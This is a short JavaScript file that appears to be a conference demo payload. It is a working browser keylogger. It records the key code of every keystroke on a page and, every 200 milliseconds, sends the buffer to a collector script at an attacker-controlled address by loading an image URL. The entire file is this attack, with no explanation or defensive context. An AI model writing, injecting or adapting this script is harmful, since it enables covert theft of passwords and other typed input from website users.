var buffer = [];
var attacker = 'http://192.168.0.16/DefCON27/keylogger.php?c='

document.onkeydown = function(e) {
    var stroke = {
        k: e.keyCode,
    };
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);
